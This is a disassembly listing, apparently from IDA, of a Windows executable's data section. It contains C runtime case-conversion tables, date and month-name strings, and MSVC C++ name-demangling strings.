                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db  10h
                db    0
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    1
                db    1
                db    0
                db    0
                db    0
                db    0
                db  80h ; €
                db  81h
                db  82h ; ‚
                db  83h ; ƒ
                db  84h ; „
                db  85h ; …
                db  86h ; †
                db  87h ; ‡
                db  88h ; ˆ
                db  89h ; ‰
                db  8Ah ; Š
                db  8Bh ; ‹
                db  8Ch ; Œ
                db  8Dh
                db  8Eh ; Ž
                db  8Fh
                db  90h
                db  91h ; ‘
                db  92h ; ’
                db  93h ; “
                db  94h ; ”
                db  95h ; •
                db  96h ; –
                db  97h ; —
                db  98h ; ˜
                db  99h ; ™
                db  9Ah ; š
                db  9Bh ; ›
                db  9Ch ; œ
                db  9Dh
                db  9Eh ; ž
                db  9Fh ; Ÿ
                db 0A0h ;  
                db 0A1h ; ¡
                db 0A2h ; ¢
                db 0A3h ; £
                db 0A4h ; ¤
                db 0A5h ; ¥
                db 0A6h ; ¦
                db 0A7h ; §
                db 0A8h ; ¨
                db 0A9h ; ©
                db 0AAh ; ª
                db 0ABh ; «
                db 0ACh ; ¬
                db 0ADh ; ­
                db 0AEh ; ®
                db 0AFh ; ¯
                db 0B0h ; °
                db 0B1h ; ±
                db 0B2h ; ²
                db 0B3h ; ³
                db 0B4h ; ´
                db 0B5h ; µ
                db 0B6h ; ¶
                db 0B7h ; ·
                db 0B8h ; ¸
                db 0B9h ; ¹
                db 0BAh ; º
                db 0BBh ; »
                db 0BCh ; ¼
                db 0BDh ; ½
                db 0BEh ; ¾
                db 0BFh ; ¿
                db 0C0h ; À
                db 0C1h ; Á
                db 0C2h ; Â
                db 0C3h ; Ã
                db 0C4h ; Ä
                db 0C5h ; Å
                db 0C6h ; Æ
                db 0C7h ; Ç
                db 0C8h ; È
                db 0C9h ; É
                db 0CAh ; Ê
                db 0CBh ; Ë
                db 0CCh ; Ì
                db 0CDh ; Í
                db 0CEh ; Î
                db 0CFh ; Ï
                db 0D0h ; Ð
                db 0D1h ; Ñ
                db 0D2h ; Ò
                db 0D3h ; Ó
                db 0D4h ; Ô
                db 0D5h ; Õ
                db 0D6h ; Ö
                db 0D7h ; ×
                db 0D8h ; Ø
                db 0D9h ; Ù
                db 0DAh ; Ú
                db 0DBh ; Û
                db 0DCh ; Ü
                db 0DDh ; Ý
                db 0DEh ; Þ
                db 0DFh ; ß
                db 0E0h ; à
                db 0E1h ; á
                db 0E2h ; â
                db 0E3h ; ã
                db 0E4h ; ä
                db 0E5h ; å
                db 0E6h ; æ
                db 0E7h ; ç
                db 0E8h ; è
                db 0E9h ; é
                db 0EAh ; ê
                db 0EBh ; ë
                db 0ECh ; ì
                db 0EDh ; í
                db 0EEh ; î
                db 0EFh ; ï
                db 0F0h ; ð
                db 0F1h ; ñ
                db 0F2h ; ò
                db 0F3h ; ó
                db 0F4h ; ô
                db 0F5h ; õ
                db 0F6h ; ö
                db 0F7h ; ÷
                db 0F8h ; ø
                db 0F9h ; ù
                db 0FAh ; ú
                db 0FBh ; û
                db 0FCh ; ü
                db 0FDh ; ý
                db 0FEh ; þ
                db 0FFh ; ÿ
unk_421100      db    0                 ; DATA XREF: .data:004257BC↓o
                db    1
                db    2
                db    3
                db    4
                db    5
                db    6
                db    7
                db    8
                db    9
                db  0Ah
                db  0Bh
                db  0Ch
                db  0Dh
                db  0Eh
                db  0Fh
                db  10h
                db  11h
                db  12h
                db  13h
                db  14h
                db  15h
                db  16h
                db  17h
                db  18h
                db  19h
                db  1Ah
                db  1Bh
                db  1Ch
                db  1Dh
                db  1Eh
                db  1Fh
                db  20h
                db  21h ; !
                db  22h ; "
                db  23h ; #
                db  24h ; $
                db  25h ; %
                db  26h ; &
                db  27h ; '
                db  28h ; (
                db  29h ; )
                db  2Ah ; *
                db  2Bh ; +
                db  2Ch ; ,
                db  2Dh ; -
                db  2Eh ; .
                db  2Fh ; /
                db  30h ; 0
                db  31h ; 1
                db  32h ; 2
                db  33h ; 3
                db  34h ; 4
                db  35h ; 5
                db  36h ; 6
                db  37h ; 7
                db  38h ; 8
                db  39h ; 9
                db  3Ah ; :
                db  3Bh ; ;
                db  3Ch ; <
                db  3Dh ; =
                db  3Eh ; >
                db  3Fh ; ?
                db  40h ; @
                db  61h ; a
                db  62h ; b
                db  63h ; c
                db  64h ; d
                db  65h ; e
                db  66h ; f
                db  67h ; g
                db  68h ; h
                db  69h ; i
                db  6Ah ; j
                db  6Bh ; k
                db  6Ch ; l
                db  6Dh ; m
                db  6Eh ; n
                db  6Fh ; o
                db  70h ; p
                db  71h ; q
                db  72h ; r
                db  73h ; s
                db  74h ; t
                db  75h ; u
                db  76h ; v
                db  77h ; w
                db  78h ; x
                db  79h ; y
                db  7Ah ; z
                db  5Bh ; [
                db  5Ch ; \
                db  5Dh ; ]
                db  5Eh ; ^
                db  5Fh ; _
                db  60h ; `
                db  61h ; a
                db  62h ; b
                db  63h ; c
                db  64h ; d
                db  65h ; e
                db  66h ; f
                db  67h ; g
                db  68h ; h
                db  69h ; i
                db  6Ah ; j
                db  6Bh ; k
                db  6Ch ; l
                db  6Dh ; m
                db  6Eh ; n
                db  6Fh ; o
                db  70h ; p
                db  71h ; q
                db  72h ; r
                db  73h ; s
                db  74h ; t
                db  75h ; u
                db  76h ; v
                db  77h ; w
                db  78h ; x
                db  79h ; y
                db  7Ah ; z
                db  7Bh ; {
                db  7Ch ; |
                db  7Dh ; }
                db  7Eh ; ~
                db  7Fh ; 
                db  80h ; €
                db  81h
                db  82h ; ‚
                db  83h ; ƒ
                db  84h ; „
                db  85h ; …
                db  86h ; †
                db  87h ; ‡
                db  88h ; ˆ
                db  89h ; ‰
                db  8Ah ; Š
                db  8Bh ; ‹
                db  8Ch ; Œ
                db  8Dh
                db  8Eh ; Ž
                db  8Fh
                db  90h
                db  91h ; ‘
                db  92h ; ’
                db  93h ; “
                db  94h ; ”
                db  95h ; •
                db  96h ; –
                db  97h ; —
                db  98h ; ˜
                db  99h ; ™
                db  9Ah ; š
                db  9Bh ; ›
                db  9Ch ; œ
                db  9Dh
                db  9Eh ; ž
                db  9Fh ; Ÿ
                db 0A0h ;  
                db 0A1h ; ¡
                db 0A2h ; ¢
                db 0A3h ; £
                db 0A4h ; ¤
                db 0A5h ; ¥
                db 0A6h ; ¦
                db 0A7h ; §
                db 0A8h ; ¨
                db 0A9h ; ©
                db 0AAh ; ª
                db 0ABh ; «
                db 0ACh ; ¬
                db 0ADh ; ­
                db 0AEh ; ®
                db 0AFh ; ¯
                db 0B0h ; °
                db 0B1h ; ±
                db 0B2h ; ²
                db 0B3h ; ³
                db 0B4h ; ´
                db 0B5h ; µ
                db 0B6h ; ¶
                db 0B7h ; ·
                db 0B8h ; ¸
                db 0B9h ; ¹
                db 0BAh ; º
                db 0BBh ; »
                db 0BCh ; ¼
                db 0BDh ; ½
                db 0BEh ; ¾
                db 0BFh ; ¿
                db 0C0h ; À
                db 0C1h ; Á
                db 0C2h ; Â
                db 0C3h ; Ã
                db 0C4h ; Ä
                db 0C5h ; Å
                db 0C6h ; Æ
                db 0C7h ; Ç
                db 0C8h ; È
                db 0C9h ; É
                db 0CAh ; Ê
                db 0CBh ; Ë
                db 0CCh ; Ì
                db 0CDh ; Í
                db 0CEh ; Î
                db 0CFh ; Ï
                db 0D0h ; Ð
                db 0D1h ; Ñ
                db 0D2h ; Ò
                db 0D3h ; Ó
                db 0D4h ; Ô
                db 0D5h ; Õ
                db 0D6h ; Ö
                db 0D7h ; ×
                db 0D8h ; Ø
                db 0D9h ; Ù
                db 0DAh ; Ú
                db 0DBh ; Û
                db 0DCh ; Ü
                db 0DDh ; Ý
                db 0DEh ; Þ
                db 0DFh ; ß
                db 0E0h ; à
                db 0E1h ; á
                db 0E2h ; â
                db 0E3h ; ã
                db 0E4h ; ä
                db 0E5h ; å
                db 0E6h ; æ
                db 0E7h ; ç
                db 0E8h ; è
                db 0E9h ; é
                db 0EAh ; ê
                db 0EBh ; ë
                db 0ECh ; ì
                db 0EDh ; í
                db 0EEh ; î
                db 0EFh ; ï
                db 0F0h ; ð
                db 0F1h ; ñ
                db 0F2h ; ò
                db 0F3h ; ó
                db 0F4h ; ô
                db 0F5h ; õ
                db 0F6h ; ö
                db 0F7h ; ÷
                db 0F8h ; ø
                db 0F9h ; ù
                db 0FAh ; ú
                db 0FBh ; û
                db 0FCh ; ü
                db 0FDh ; ý
                db 0FEh ; þ
                db 0FFh ; ÿ
                db  80h ; €
                db  81h
                db  82h ; ‚
                db  83h ; ƒ
                db  84h ; „
                db  85h ; …
                db  86h ; †
                db  87h ; ‡
                db  88h ; ˆ
                db  89h ; ‰
                db  8Ah ; Š
                db  8Bh ; ‹
                db  8Ch ; Œ
                db  8Dh
                db  8Eh ; Ž
                db  8Fh
                db  90h
                db  91h ; ‘
                db  92h ; ’
                db  93h ; “
                db  94h ; ”
                db  95h ; •
                db  96h ; –
                db  97h ; —
                db  98h ; ˜
                db  99h ; ™
                db  9Ah ; š
                db  9Bh ; ›
                db  9Ch ; œ
                db  9Dh
                db  9Eh ; ž
                db  9Fh ; Ÿ
                db 0A0h ;  
                db 0A1h ; ¡
                db 0A2h ; ¢
                db 0A3h ; £
                db 0A4h ; ¤
                db 0A5h ; ¥
                db 0A6h ; ¦
                db 0A7h ; §
                db 0A8h ; ¨
                db 0A9h ; ©
                db 0AAh ; ª
                db 0ABh ; «
                db 0ACh ; ¬
                db 0ADh ; ­
                db 0AEh ; ®
                db 0AFh ; ¯
                db 0B0h ; °
                db 0B1h ; ±
                db 0B2h ; ²
                db 0B3h ; ³
                db 0B4h ; ´
                db 0B5h ; µ
                db 0B6h ; ¶
                db 0B7h ; ·
                db 0B8h ; ¸
                db 0B9h ; ¹
                db 0BAh ; º
                db 0BBh ; »
                db 0BCh ; ¼
                db 0BDh ; ½
                db 0BEh ; ¾
                db 0BFh ; ¿
                db 0C0h ; À
                db 0C1h ; Á
                db 0C2h ; Â
                db 0C3h ; Ã
                db 0C4h ; Ä
                db 0C5h ; Å
                db 0C6h ; Æ
                db 0C7h ; Ç
                db 0C8h ; È
                db 0C9h ; É
                db 0CAh ; Ê
                db 0CBh ; Ë
                db 0CCh ; Ì
                db 0CDh ; Í
                db 0CEh ; Î
                db 0CFh ; Ï
                db 0D0h ; Ð
                db 0D1h ; Ñ
                db 0D2h ; Ò
                db 0D3h ; Ó
                db 0D4h ; Ô
                db 0D5h ; Õ
                db 0D6h ; Ö
                db 0D7h ; ×
                db 0D8h ; Ø
                db 0D9h ; Ù
                db 0DAh ; Ú
                db 0DBh ; Û
                db 0DCh ; Ü
                db 0DDh ; Ý
                db 0DEh ; Þ
                db 0DFh ; ß
                db 0E0h ; à
                db 0E1h ; á
                db 0E2h ; â
                db 0E3h ; ã
                db 0E4h ; ä
                db 0E5h ; å
                db 0E6h ; æ
                db 0E7h ; ç
                db 0E8h ; è
                db 0E9h ; é
                db 0EAh ; ê
                db 0EBh ; ë
                db 0ECh ; ì
                db 0EDh ; í
                db 0EEh ; î
                db 0EFh ; ï
                db 0F0h ; ð
                db 0F1h ; ñ
                db 0F2h ; ò
                db 0F3h ; ó
                db 0F4h ; ô
                db 0F5h ; õ
                db 0F6h ; ö
                db 0F7h ; ÷
                db 0F8h ; ø
                db 0F9h ; ù
                db 0FAh ; ú
                db 0FBh ; û
                db 0FCh ; ü
                db 0FDh ; ý
                db 0FEh ; þ
                db 0FFh ; ÿ
unk_421280      db    0                 ; DATA XREF: .data:004257C0↓o
                db    1
                db    2
                db    3
                db    4
                db    5
                db    6
                db    7
                db    8
                db    9
                db  0Ah
                db  0Bh
                db  0Ch
                db  0Dh
                db  0Eh
                db  0Fh
                db  10h
                db  11h
                db  12h
                db  13h
                db  14h
                db  15h
                db  16h
                db  17h
                db  18h
                db  19h
                db  1Ah
                db  1Bh
                db  1Ch
                db  1Dh
                db  1Eh
                db  1Fh
                db  20h
                db  21h ; !
                db  22h ; "
                db  23h ; #
                db  24h ; $
                db  25h ; %
                db  26h ; &
                db  27h ; '
                db  28h ; (
                db  29h ; )
                db  2Ah ; *
                db  2Bh ; +
                db  2Ch ; ,
                db  2Dh ; -
                db  2Eh ; .
                db  2Fh ; /
                db  30h ; 0
                db  31h ; 1
                db  32h ; 2
                db  33h ; 3
                db  34h ; 4
                db  35h ; 5
                db  36h ; 6
                db  37h ; 7
                db  38h ; 8
                db  39h ; 9
                db  3Ah ; :
                db  3Bh ; ;
                db  3Ch ; <
                db  3Dh ; =
                db  3Eh ; >
                db  3Fh ; ?
                db  40h ; @
                db  41h ; A
                db  42h ; B
                db  43h ; C
                db  44h ; D
                db  45h ; E
                db  46h ; F
                db  47h ; G
                db  48h ; H
                db  49h ; I
                db  4Ah ; J
                db  4Bh ; K
                db  4Ch ; L
                db  4Dh ; M
                db  4Eh ; N
                db  4Fh ; O
                db  50h ; P
                db  51h ; Q
                db  52h ; R
                db  53h ; S
                db  54h ; T
                db  55h ; U
                db  56h ; V
                db  57h ; W
                db  58h ; X
                db  59h ; Y
                db  5Ah ; Z
                db  5Bh ; [
                db  5Ch ; \
                db  5Dh ; ]
                db  5Eh ; ^
                db  5Fh ; _
                db  60h ; `
                db  41h ; A
                db  42h ; B
                db  43h ; C
                db  44h ; D
                db  45h ; E
                db  46h ; F
                db  47h ; G
                db  48h ; H
                db  49h ; I
                db  4Ah ; J
                db  4Bh ; K
                db  4Ch ; L
                db  4Dh ; M
                db  4Eh ; N
                db  4Fh ; O
                db  50h ; P
                db  51h ; Q
                db  52h ; R
                db  53h ; S
                db  54h ; T
                db  55h ; U
                db  56h ; V
                db  57h ; W
                db  58h ; X
                db  59h ; Y
                db  5Ah ; Z
                db  7Bh ; {
                db  7Ch ; |
                db  7Dh ; }
                db  7Eh ; ~
                db  7Fh ; 
                db  80h ; €
                db  81h
                db  82h ; ‚
                db  83h ; ƒ
                db  84h ; „
                db  85h ; …
                db  86h ; †
                db  87h ; ‡
                db  88h ; ˆ
                db  89h ; ‰
                db  8Ah ; Š
                db  8Bh ; ‹
                db  8Ch ; Œ
                db  8Dh
                db  8Eh ; Ž
                db  8Fh
                db  90h
                db  91h ; ‘
                db  92h ; ’
                db  93h ; “
                db  94h ; ”
                db  95h ; •
                db  96h ; –
                db  97h ; —
                db  98h ; ˜
                db  99h ; ™
                db  9Ah ; š
                db  9Bh ; ›
                db  9Ch ; œ
                db  9Dh
                db  9Eh ; ž
                db  9Fh ; Ÿ
                db 0A0h ;  
                db 0A1h ; ¡
                db 0A2h ; ¢
                db 0A3h ; £
                db 0A4h ; ¤
                db 0A5h ; ¥
                db 0A6h ; ¦
                db 0A7h ; §
                db 0A8h ; ¨
                db 0A9h ; ©
                db 0AAh ; ª
                db 0ABh ; «
                db 0ACh ; ¬
                db 0ADh ; ­
                db 0AEh ; ®
                db 0AFh ; ¯
                db 0B0h ; °
                db 0B1h ; ±
                db 0B2h ; ²
                db 0B3h ; ³
                db 0B4h ; ´
                db 0B5h ; µ
                db 0B6h ; ¶
                db 0B7h ; ·
                db 0B8h ; ¸
                db 0B9h ; ¹
                db 0BAh ; º
                db 0BBh ; »
                db 0BCh ; ¼
                db 0BDh ; ½
                db 0BEh ; ¾
                db 0BFh ; ¿
                db 0C0h ; À
                db 0C1h ; Á
                db 0C2h ; Â
                db 0C3h ; Ã
                db 0C4h ; Ä
                db 0C5h ; Å
                db 0C6h ; Æ
                db 0C7h ; Ç
                db 0C8h ; È
                db 0C9h ; É
                db 0CAh ; Ê
                db 0CBh ; Ë
                db 0CCh ; Ì
                db 0CDh ; Í
                db 0CEh ; Î
                db 0CFh ; Ï
                db 0D0h ; Ð
                db 0D1h ; Ñ
                db 0D2h ; Ò
                db 0D3h ; Ó
                db 0D4h ; Ô
                db 0D5h ; Õ
                db 0D6h ; Ö
                db 0D7h ; ×
                db 0D8h ; Ø
                db 0D9h ; Ù
                db 0DAh ; Ú
                db 0DBh ; Û
                db 0DCh ; Ü
                db 0DDh ; Ý
                db 0DEh ; Þ
                db 0DFh ; ß
                db 0E0h ; à
                db 0E1h ; á
                db 0E2h ; â
                db 0E3h ; ã
                db 0E4h ; ä
                db 0E5h ; å
                db 0E6h ; æ
                db 0E7h ; ç
                db 0E8h ; è
                db 0E9h ; é
                db 0EAh ; ê
                db 0EBh ; ë
                db 0ECh ; ì
                db 0EDh ; í
                db 0EEh ; î
                db 0EFh ; ï
                db 0F0h ; ð
                db 0F1h ; ñ
                db 0F2h ; ò
                db 0F3h ; ó
                db 0F4h ; ô
                db 0F5h ; õ
                db 0F6h ; ö
                db 0F7h ; ÷
                db 0F8h ; ø
                db 0F9h ; ù
                db 0FAh ; ú
                db 0FBh ; û
                db 0FCh ; ü
                db 0FDh ; ý
                db 0FEh ; þ
                db 0FFh ; ÿ
aHhMmSs         db 'HH:mm:ss',0         ; DATA XREF: .data:00425EC0↓o
                db    0
                db    0
                db    0
aDdddMmmmDdYyyy db 'dddd, MMMM dd, yyyy',0
                                        ; DATA XREF: .data:00425EBC↓o
aMmDdYy         db 'MM/dd/yy',0         ; DATA XREF: .data:00425EB8↓o
                db    0
                db    0
                db    0
unk_4213AC      db  50h ; P             ; DATA XREF: .data:00425EB4↓o
                db  4Dh ; M
                db    0
                db    0
unk_4213B0      db  41h ; A             ; DATA XREF: .data:00425EB0↓o
                db  4Dh ; M
                db    0
                db    0
aDecember       db 'December',0         ; DATA XREF: .data:00425EAC↓o
                db    0
                db    0
                db    0
aNovember       db 'November',0         ; DATA XREF: .data:00425EA8↓o
                db    0
                db    0
                db    0
aOctober        db 'October',0          ; DATA XREF: .data:00425EA4↓o
aSeptember      db 'September',0        ; DATA XREF: .data:00425EA0↓o
                db    0
                db    0
aAugust         db 'August',0           ; DATA XREF: .data:00425E9C↓o
                db    0
aJuly           db 'July',0             ; DATA XREF: .data:00425E98↓o
                db    0
                db    0
                db    0
aJune           db 'June',0             ; DATA XREF: .data:00425E94↓o
                db    0
                db    0
                db    0
aApril          db 'April',0            ; DATA XREF: .data:00425E8C↓o
                db    0
                db    0
aMarch          db 'March',0            ; DATA XREF: .data:00425E88↓o
                db    0
                db    0
aFebruary       db 'February',0         ; DATA XREF: .data:00425E84↓o
                db    0
                db    0
                db    0
aJanuary        db 'January',0          ; DATA XREF: .data:00425E80↓o
unk_42141C      db  44h ; D             ; DATA XREF: .data:00425E7C↓o
                db  65h ; e
                db  63h ; c
                db    0
unk_421420      db  4Eh ; N             ; DATA XREF: .data:00425E78↓o
                db  6Fh ; o
                db  76h ; v
                db    0
unk_421424      db  4Fh ; O             ; DATA XREF: .data:00425E74↓o
                db  63h ; c
                db  74h ; t
                db    0
unk_421428      db  53h ; S             ; DATA XREF: .data:00425E70↓o
                db  65h ; e
                db  70h ; p
                db    0
unk_42142C      db  41h ; A             ; DATA XREF: .data:00425E6C↓o
                db  75h ; u
                db  67h ; g
                db    0
unk_421430      db  4Ah ; J             ; DATA XREF: .data:00425E68↓o
                db  75h ; u
                db  6Ch ; l
                db    0
unk_421434      db  4Ah ; J             ; DATA XREF: .data:00425E64↓o
                db  75h ; u
                db  6Eh ; n
                db    0
unk_421438      db  4Dh ; M             ; DATA XREF: .data:00425E60↓o
                                        ; .data:00425E90↓o
                db  61h ; a
                db  79h ; y
                db    0
unk_42143C      db  41h ; A             ; DATA XREF: .data:00425E5C↓o
                db  70h ; p
                db  72h ; r
                db    0
unk_421440      db  4Dh ; M             ; DATA XREF: .data:00425E58↓o
                db  61h ; a
                db  72h ; r
                db    0
unk_421444      db  46h ; F             ; DATA XREF: .data:00425E54↓o
                db  65h ; e
                db  62h ; b
                db    0
unk_421448      db  4Ah ; J             ; DATA XREF: .data:00425E50↓o
                db  61h ; a
                db  6Eh ; n
                db    0
aSaturday       db 'Saturday',0         ; DATA XREF: .data:00425E4C↓o
                db    0
                db    0
                db    0
aFriday         db 'Friday',0           ; DATA XREF: .data:00425E48↓o
                db    0
aThursday       db 'Thursday',0         ; DATA XREF: .data:00425E44↓o
                db    0
                db    0
                db    0
aWednesday      db 'Wednesday',0        ; DATA XREF: .data:00425E40↓o
                db    0
                db    0
aTuesday        db 'Tuesday',0          ; DATA XREF: .data:00425E3C↓o
aMonday         db 'Monday',0           ; DATA XREF: .data:00425E38↓o
                db    0
aSunday         db 'Sunday',0           ; DATA XREF: .data:00425E34↓o
                db    0
unk_421490      db  53h ; S             ; DATA XREF: .data:00425E30↓o
                db  61h ; a
                db  74h ; t
                db    0
unk_421494      db  46h ; F             ; DATA XREF: .data:00425E2C↓o
                db  72h ; r
                db  69h ; i
                db    0
unk_421498      db  54h ; T             ; DATA XREF: .data:00425E28↓o
                db  68h ; h
                db  75h ; u
                db    0
unk_42149C      db  57h ; W             ; DATA XREF: .data:00425E24↓o
                db  65h ; e
                db  64h ; d
                db    0
unk_4214A0      db  54h ; T             ; DATA XREF: .data:00425E20↓o
                db  75h ; u
                db  65h ; e
                db    0
unk_4214A4      db  4Dh ; M             ; DATA XREF: .data:00425E1C↓o
                db  6Fh ; o
                db  6Eh ; n
                db    0
unk_4214A8      db  53h ; S             ; DATA XREF: .data:off_425E18↓o
                db  75h ; u
                db  6Eh ; n
                db    0
aE000           db 'e+000',0            ; DATA XREF: sub_41BAD6:loc_41BBB0↑o
                align 8
dbl_4214B8      dq 4195835.0            ; DATA XREF: sub_41C42A+11↑r
dbl_4214C0      dq 3145727.0            ; DATA XREF: sub_41C42A+8↑r
; CHAR aIsprocessorfea[]
aIsprocessorfea db 'IsProcessorFeaturePresent',0
                                        ; DATA XREF: sub_41C468+F↑o
                align 4
; CHAR aKernel32[]
aKernel32       db 'KERNEL32',0         ; DATA XREF: sub_41C468↑o
                align 10h
aCompleteObject db ' Complete Object Locator',27h,0
                                        ; DATA XREF: .rdata:00421AC4↓o
                align 4
aClassHierarchy db ' Class Hierarchy Descriptor',27h,0
                                        ; DATA XREF: .rdata:00421AC0↓o
                align 4
aBaseClassArray db ' Base Class Array',27h,0
                                        ; DATA XREF: .rdata:00421ABC↓o
                align 10h
aBaseClassDescr db ' Base Class Descriptor at (',0
                                        ; DATA XREF: .rdata:00421AB8↓o
aTypeDescriptor db ' Type Descriptor',27h,0
                                        ; DATA XREF: .rdata:00421AB4↓o
                align 10h
aLocalStaticThr db '`local static thread guard',27h,0
                                        ; DATA XREF: .rdata:00421C00↓o
aManagedVectorC db '`managed vector copy constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BFC↓o
                align 4
aVectorVbaseCop db '`vector vbase copy constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BF8↓o
                align 4
aVectorCopyCons db '`vector copy constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BF4↓o
                align 4
aDynamicAtexitD db '`dynamic atexit destructor for ',27h,0
                                        ; DATA XREF: .rdata:00421BF0↓o
                align 4
aDynamicInitial db '`dynamic initializer for ',27h,0
                                        ; DATA XREF: .rdata:00421BEC↓o
                align 4
aEhVectorVbaseC db '`eh vector vbase copy constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BE8↓o
aEhVectorCopyCo db '`eh vector copy constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BE4↓o
                align 4
aManagedVectorD db '`managed vector destructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BE0↓o
                align 4
aManagedVectorC_0 db '`managed vector constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BDC↓o
                align 4
aPlacementDelet db '`placement delete[] closure',27h,0
                                        ; DATA XREF: .rdata:00421BD8↓o
                align 4
aPlacementDelet_0 db '`placement delete closure',27h,0
                                        ; DATA XREF: .rdata:00421BD4↓o
                align 4
aOmniCallsig    db '`omni callsig',27h,0
                                        ; DATA XREF: .rdata:00421BD0↓o
                align 4
aDelete         db ' delete[]',0        ; DATA XREF: .rdata:00421BCC↓o
                align 4
aNew            db ' new[]',0           ; DATA XREF: .rdata:00421BC8↓o
                align 4
aLocalVftableCo db '`local vftable constructor closure',27h,0
                                        ; DATA XREF: .rdata:00421BC4↓o
aLocalVftable   db '`local vftable',27h,0
                                        ; DATA XREF: .rdata:00421BC0↓o
aRtti           db '`RTTI',0            ; DATA XREF: .rdata:00421BBC↓o
                align 4
aEh             db '`EH',0              ; DATA XREF: .rdata:00421BB8↓o
aUdtReturning   db '`udt returning',27h,0
                                        ; DATA XREF: .rdata:00421BB4↓o
aCopyConstructo db '`copy constructor closure',27h,0
                                        ; DATA XREF: .rdata:00421BB0↓o
                align 4
aEhVectorVbaseC_0 db '`eh vector vbase constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BAC↓o
                align 10h
aEhVectorDestru db '`eh vector destructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BA8↓o
aEhVectorConstr db '`eh vector constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421BA4↓o
                align 4
aVirtualDisplac db '`virtual displacement map',27h,0
                                        ; DATA XREF: .rdata:00421BA0↓o
                align 10h
aVectorVbaseCon db '`vector vbase constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421B9C↓o
aVectorDestruct db '`vector destructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421B98↓o
                align 4
aVectorConstruc db '`vector constructor iterator',27h,0
                                        ; DATA XREF: .rdata:00421B94↓o
                align 4
aScalarDeleting db '`scalar deleting destructor',27h,0
                                        ; DATA XREF: .rdata:00421B90↓o
                align 4
aDefaultConstru db '`default constructor closure',27h,0
                                        ; DATA XREF: .rdata:00421B8C↓o
                align 4
aVectorDeleting db '`vector deleting destructor',27h,0
                                        ; DATA XREF: .rdata:00421B88↓o
                align 4
aVbaseDestructo db '`vbase destructor',27h,0
                                        ; DATA XREF: .rdata:00421B84↓o
                align 4
aString         db '`string',27h,0      ; DATA XREF: .rdata:00421B80↓o
                align 4
aLocalStaticGua db '`local static guard',27h,0
                                        ; DATA XREF: .rdata:00421B7C↓o
                align 4
aTypeof         db '`typeof',27h,0      ; DATA XREF: .rdata:00421B78↓o
                align 4
aVcall          db '`vcall',27h,0       ; DATA XREF: .rdata:00421B74↓o
aVbtable        db '`vbtable',27h,0     ; DATA XREF: .rdata:00421B70↓o
                align 4
aVftable        db '`vftable',27h,0     ; DATA XREF: .rdata:00421B6C↓o
                align 4
asc_421968      db '^=',0               ; DATA XREF: .rdata:00421B68↓o
                align 4
asc_42196C      db '|=',0               ; DATA XREF: .rdata:00421B64↓o
                align 10h
asc_421970      db '&=',0               ; DATA XREF: .rdata:00421B60↓o
                align 4
asc_421974      db '<<=',0              ; DATA XREF: .rdata:00421B5C↓o
asc_421978      db '>>=',0              ; DATA XREF: .rdata:00421B58↓o
asc_42197C      db '%=',0               ; DATA XREF: .rdata:00421B54↓o
                align 10h
asc_421980      db '/=',0               ; DATA XREF: .rdata:00421B50↓o
                align 4
asc_421984      db '-=',0               ; DATA XREF: .rdata:00421B4C↓o
                align 4
asc_421988      db '+=',0               ; DATA XREF: .rdata:00421B48↓o
                align 4
asc_42198C      db '*=',0               ; DATA XREF: .rdata:00421B44↓o
                align 10h
asc_421990      db '||',0               ; DATA XREF: .rdata:00421B40↓o
                align 4
asc_421994      db '&&',0               ; DATA XREF: .rdata:00421B3C↓o
                align 4
asc_421998      db '|',0                ; DATA XREF: .rdata:00421B38↓o
                align 4
asc_42199C      db '^',0                ; DATA XREF: .rdata:00421B34↓o
                align 10h
asc_4219A0      db '~',0                ; DATA XREF: .rdata:00421B30↓o
                align 4
asc_4219A4      db '()',0               ; DATA XREF: .rdata:00421B2C↓o
                align 4
asc_4219A8      db ',',0                ; DATA XREF: .rdata:00421B28↓o
                align 4
asc_4219AC      db '>=',0               ; DATA XREF: .rdata:00421B24↓o
                align 10h
asc_4219B0      db '<=',0               ; DATA XREF: .rdata:00421B1C↓o
                align 4
asc_4219B4      db '<',0                ; DATA XREF: .rdata:00421B18↓o
                align 4
asc_4219B8      db '%',0                ; DATA XREF: .rdata:00421B14↓o
                align 4
asc_4219BC      db '/',0                ; DATA XREF: .rdata:00421B10↓o
                align 10h
asc_4219C0      db '->*',0              ; DATA XREF: .rdata:00421B0C↓o
asc_4219C4      db '&',0                ; DATA XREF: .rdata:00421B08↓o
                align 4
asc_4219C8      db '+',0                ; DATA XREF: .rdata:00421B04↓o
                align 4
asc_4219CC      db '-',0                ; DATA XREF: .rdata:00421B00↓o
                align 10h
asc_4219D0      db '--',0               ; DATA XREF: .rdata:00421AFC↓o
                align 4
asc_4219D4      db '++',0               ; DATA XREF: .rdata:00421AF8↓o
                align 4
asc_4219D8      db '*',0                ; DATA XREF: .rdata:00421AF4↓o
                align 4
asc_4219DC      db '->',0               ; DATA XREF: .rdata:00421AF0↓o
                align 10h
aOperator       db 'operator',0         ; DATA XREF: .rdata:00421AEC↓o
                align 4
asc_4219EC      db '[]',0               ; DATA XREF: .rdata:00421AE8↓o
                align 10h
asc_4219F0      db '!=',0               ; DATA XREF: .rdata:00421AE4↓o
                align 4
asc_4219F4      db '==',0               ; DATA XREF: .rdata:00421AE0↓o
                align 4
asc_4219F8      db '!',0                ; DATA XREF: .rdata:00421ADC↓o
                align 4
asc_4219FC      db '<<',0               ; DATA XREF: .rdata:00421AD8↓o
                align 10h
asc_421A00      db '>>',0               ; DATA XREF: .rdata:00421AD4↓o
                align 4
aDelete_0       db ' delete',0          ; DATA XREF: .rdata:00421ACC↓o
aNew_0          db ' new',0             ; DATA XREF: .rdata:00421AC8↓o
                align 4
